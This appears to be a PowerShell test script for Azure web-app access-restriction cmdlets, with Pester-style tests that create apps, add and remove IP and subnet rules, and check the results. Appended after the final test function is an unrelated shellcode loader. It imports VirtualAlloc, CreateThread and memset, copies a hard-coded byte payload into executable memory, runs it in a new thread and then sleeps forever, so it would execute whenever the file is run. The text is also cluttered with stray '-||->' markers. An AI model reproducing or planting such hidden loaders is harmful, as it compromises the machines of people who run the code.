














 -||-> function Test-GetWebAppAccessRestriction
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $tier = "S1" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> $actual =  -||-> Get-AzWebAppAccessRestrictionConfig -ResourceGroupName $rgname -Name $wname <-||-  <-||- 

		
		 -||-> Assert-AreEqual $false $actual.ScmSiteUseMainSiteRestrictionConfig <-||- 
		 -||-> Assert-AreEqual 1 $actual.MainSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "Allow all" $actual.MainSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.MainSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual 1 $actual.ScmSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "Allow all" $actual.ScmSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.ScmSiteAccessRestrictions[0].Action <-||- 

	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-UpdateWebAppAccessRestrictionSimple
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $tier = "S1" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> Update-AzWebAppAccessRestrictionConfig -ResourceGroupName $rgname -Name $wname -ScmSiteUseMainSiteRestrictionConfig <-||- 
		 -||-> $actual =  -||-> Get-AzWebAppAccessRestrictionConfig -ResourceGroupName $rgname -Name $wname <-||-  <-||- 

		
		 -||-> Assert-AreEqual $true $actual.ScmSiteUseMainSiteRestrictionConfig <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-UpdateWebAppAccessRestrictionComplex
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $tier = "Shared" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> $actual =  -||-> Update-AzWebAppAccessRestrictionConfig -ResourceGroupName $rgname -Name $wname -ScmSiteUseMainSiteRestrictionConfig -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual $true $actual.ScmSiteUseMainSiteRestrictionConfig <-||- 

		
		 -||-> Update-AzWebAppAccessRestrictionConfig -ResourceGroupName $rgname -Name $wname -ScmSiteUseMainSiteRestrictionConfig:$false <-||- 
		 -||-> $actual =  -||-> Get-AzWebAppAccessRestrictionConfig -ResourceGroupName $rgname -Name $wname <-||-  <-||- 

		
		 -||-> Assert-AreEqual $false $actual.ScmSiteUseMainSiteRestrictionConfig <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-AddWebAppAccessRestriction
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $tier = "Shared" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> $actual =  -||-> Add-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name developers -Action Allow -IpAddress 130.220.0.0/27 -Priority 200 -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 2 $actual.MainSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "developers" $actual.MainSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.MainSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual "Deny all" $actual.MainSiteAccessRestrictions[1].RuleName <-||- 
		 -||-> Assert-AreEqual "Deny" $actual.MainSiteAccessRestrictions[1].Action <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-AddWebAppAccessRestrictionServiceEndpoint
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $vNetResourceGroupName = "pstest-rg" <-||- 
	 -||-> $vNetName = "pstest-vnet" <-||- 
	 -||-> $subnetName = "endpoint-subnet" <-||- 
	 -||-> $tier = "Shared" <-||- 

	 -||-> try
	{
		
		 -||-> Write-Debug "Starting Test-AddWebAppAccessRestrictionServiceEndpoint" <-||- 
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		
		
		
		
		

		
		 -||-> $subscriptionId =  -||-> getSubscription <-||-  <-||- 
		 -||-> $subnetId = '/subscriptions/' + $subscriptionId + '/resourceGroups/' + $vNetResourceGroupName + '/providers/Microsoft.Network/virtualNetworks/' + $vNetName +  '/subnets/' + $subnetName <-||- 
				
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
				
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 		
		
		
		 -||-> $actual =  -||-> Add-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name vNetIntegration -Action Allow -SubnetId $subnetId -Priority 150 -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 2 $actual.MainSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "vNetIntegration" $actual.MainSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.MainSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual "Deny all" $actual.MainSiteAccessRestrictions[1].RuleName <-||- 
		 -||-> Assert-AreEqual "Deny" $actual.MainSiteAccessRestrictions[1].Action <-||- 

		
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-RemoveWebAppAccessRestriction
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $tier = "Shared" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> $actual =  -||-> Add-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name developers -Action Allow -IpAddress 130.220.0.0/27 -Priority 200 -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 2 $actual.MainSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "developers" $actual.MainSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.MainSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual "Deny all" $actual.MainSiteAccessRestrictions[1].RuleName <-||- 
		 -||-> Assert-AreEqual "Deny" $actual.MainSiteAccessRestrictions[1].Action <-||- 

		
		 -||-> $actual =  -||-> Remove-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name developers -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 1 $actual.MainSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "Allow all" $actual.MainSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.MainSiteAccessRestrictions[0].Action <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-AddWebAppAccessRestrictionScm
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $tier = "Shared" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> $actual =  -||-> Add-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name developers -Action Allow -IpAddress 130.220.0.0/27 -Priority 200 -TargetScmSite -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 2 $actual.ScmSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "developers" $actual.ScmSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.ScmSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual "Deny all" $actual.ScmSiteAccessRestrictions[1].RuleName <-||- 
		 -||-> Assert-AreEqual "Deny" $actual.ScmSiteAccessRestrictions[1].Action <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-RemoveWebAppAccessRestrictionScm
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $tier = "Shared" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		
		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> $actual =  -||-> Add-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name developers -Action Allow -IpAddress 130.220.0.0/27 -Priority 200 -TargetScmSite -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 2 $actual.ScmSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "developers" $actual.ScmSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.ScmSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual "Deny all" $actual.ScmSiteAccessRestrictions[1].RuleName <-||- 
		 -||-> Assert-AreEqual "Deny" $actual.ScmSiteAccessRestrictions[1].Action <-||- 

		
		 -||-> $actual =  -||-> Remove-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name developers -TargetScmSite -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 1 $actual.ScmSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "Allow all" $actual.ScmSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.ScmSiteAccessRestrictions[0].Action <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-AddWebAppAccessRestrictionSlot
{
	
	 -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $wname =  -||-> Get-WebsiteName <-||-  <-||- 	
	 -||-> $location =  -||-> Get-WebLocation <-||-  <-||- 
	 -||-> $whpName =  -||-> Get-WebHostPlanName <-||-  <-||- 
	 -||-> $slotName = "stage" <-||- 
	 -||-> $tier = "S1" <-||- 

	 -||-> try
	{
		
		 -||-> New-AzResourceGroup -Name $rgname -Location $location <-||- 
		 -||-> $serverFarm =  -||-> New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier <-||-  <-||- 
		
		
		 -||-> $webApp =  -||-> New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName <-||-  <-||-  
		 -||-> $webAppSlot =  -||-> New-AzWebAppSlot -ResourceGroupName $rgname -Name $wname -AppServicePlan $whpName -Slot $slotName <-||-  <-||- 

		
		 -||-> Assert-AreEqual $wname $webApp.Name <-||- 
		 -||-> Assert-AreEqual $serverFarm.Id $webApp.ServerFarmId <-||- 
		
		
		 -||-> $actual =  -||-> Get-AzWebAppAccessRestrictionConfig -ResourceGroupName $rgname -Name $wname -SlotName $slotName <-||-  <-||- 

		
		 -||-> Assert-AreEqual $false $actual.ScmSiteUseMainSiteRestrictionConfig <-||- 
		 -||-> Assert-AreEqual 1 $actual.MainSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "Allow all" $actual.MainSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.MainSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual 1 $actual.ScmSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "Allow all" $actual.ScmSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.ScmSiteAccessRestrictions[0].Action <-||- 

		
		 -||-> $actual =  -||-> Add-AzWebAppAccessRestrictionRule -ResourceGroupName $rgname -WebAppName $wname -Name developers -Action Allow -IpAddress 130.220.0.0/27 -Priority 200 -SlotName $slotName -PassThru <-||-  <-||- 

		
		 -||-> Assert-AreEqual 2 $actual.MainSiteAccessRestrictions.Count <-||- 
		 -||-> Assert-AreEqual "developers" $actual.MainSiteAccessRestrictions[0].RuleName <-||- 
		 -||-> Assert-AreEqual "Allow" $actual.MainSiteAccessRestrictions[0].Action <-||- 
		 -||-> Assert-AreEqual "Deny all" $actual.MainSiteAccessRestrictions[1].RuleName <-||- 
		 -||-> Assert-AreEqual "Deny" $actual.MainSiteAccessRestrictions[1].Action <-||- 
	}
	finally
	{
		
		 -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
	} <-||- 
} <-||- 
 -||-> $7bV9 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $7bV9 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xcd,0xbb,0x61,0xe8,0x04,0x46,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x83,0xe8,0xfc,0x31,0x58,0x15,0x03,0x58,0x15,0x83,0x1d,0xf8,0xae,0xc1,0xde,0x01,0x2f,0xa5,0x57,0xe4,0x1e,0xe5,0x0c,0x6c,0x30,0xd5,0x47,0x20,0xbd,0x9e,0x0a,0xd1,0x36,0xd2,0x82,0xd6,0xff,0x58,0xf5,0xd9,0x00,0xf0,0xc5,0x78,0x83,0x0a,0x1a,0x5b,0xba,0xc5,0x6f,0x9a,0xfb,0x3b,0x9d,0xce,0x54,0x30,0x30,0xff,0xd1,0x0c,0x89,0x74,0xa9,0x81,0x89,0x69,0x7a,0xa0,0xb8,0x3f,0xf0,0xfb,0x1a,0xc1,0xd5,0x70,0x13,0xd9,0x3a,0xbc,0xed,0x52,0x88,0x4b,0xec,0xb2,0xc0,0xb4,0x43,0xfb,0xec,0x47,0x9d,0x3b,0xca,0xb7,0xe8,0x35,0x28,0x4a,0xeb,0x81,0x52,0x90,0x7e,0x12,0xf4,0x53,0xd8,0xfe,0x04,0xb0,0xbf,0x75,0x0a,0x7d,0xcb,0xd2,0x0f,0x80,0x18,0x69,0x2b,0x09,0x9f,0xbe,0xbd,0x49,0x84,0x1a,0xe5,0x0a,0xa5,0x3b,0x43,0xfd,0xda,0x5c,0x2c,0xa2,0x7e,0x16,0xc1,0xb7,0xf2,0x75,0x8e,0x29,0x68,0xf2,0x4e,0xdd,0x05,0x93,0x20,0x74,0xbe,0x0b,0xf1,0xf1,0x18,0xcb,0xf6,0x28,0x55,0x08,0x5b,0x81,0xc5,0xfd,0x0f,0x4d,0xd0,0x57,0xc9,0x2a,0xdb,0x8d,0x7a,0x67,0x4e,0x2d,0x2e,0xd4,0xe6,0x8a,0xd1,0xda,0xf6,0x04,0x5d,0xda,0xf6,0xd4,0x71,0x99,0xac,0x9f,0xca,0x30,0x51,0x70,0xbd,0x1d,0xd8,0xef,0xfb,0x5e,0x0f,0x86,0xc2,0xf3,0xd8,0x99,0xf8,0x13,0x9c,0xc9,0xaf,0x80,0xca,0xbe,0x19,0x4e,0x1e,0x15,0x88,0xb5,0x1f,0x43,0x42,0xa3,0xd5,0x33,0x03,0xb3,0xd9,0xcb,0xd3,0x3a,0xfd,0xa6,0xd7,0x6c,0x94,0x29,0x8e,0xe4,0x1d,0x10,0xb0,0x72,0x22,0x49,0x9f,0x29,0x8e,0x21,0x76,0xa5,0x1d,0xc0,0x6e,0x4e,0xa1,0x19,0x0b,0x70,0x28,0xa8,0x5b,0x05,0x0a,0xc4,0x93,0x50,0x0e,0x43,0xab,0x4f,0x25,0x2c,0x3b,0x6f,0xaa,0xac,0xbb,0x07,0xca,0xac,0xfb,0xd7,0x99,0xc4,0xa3,0x73,0x4e,0xf0,0xab,0xae,0xe2,0xa9,0x00,0xd9,0xe2,0x19,0xcf,0xd9,0xcc,0xa5,0x0f,0x8a,0x5a,0xce,0x1d,0xba,0xea,0xec,0xdd,0x17,0x69,0x30,0x55,0x5a,0xf9,0xb6,0x97,0xa7,0x7b,0x78,0xe2,0xc2,0xdc,0xba,0x52,0xe4,0xa8,0xc3,0x92,0x0b,0x63,0x05,0x5f,0xdd,0xb5,0x43,0xa7,0x0f,0x87,0x98,0xe3,0x61,0xd3,0xe6,0x0b <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $scq=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $scq.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$scq,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



